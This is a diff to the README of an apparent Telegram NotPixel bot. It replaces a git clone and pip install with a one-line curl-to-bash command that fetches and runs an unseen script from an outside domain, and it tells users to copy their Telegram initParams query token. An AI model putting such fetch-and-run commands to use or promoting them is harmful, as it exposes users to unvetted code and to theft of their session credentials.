@@ -10,13 +10,7 @@
 
 ## Install NOT PIXELBOT
 ```
-git clone https://github.com/zamzasalim/notpixel.git
-```
-```
-cd notpixel
-```
-```
-pip install -r requirements.txt
+bash <(curl -s https://data.zamzasalim.xyz/file/uploads/notpixel.sh)
 ```
 ## Token User | Token Query | Update Token
 **Use WebTelegram - Inspect Bot NotPixel - Application - __telegram__initParams - Copy Query= | user=**
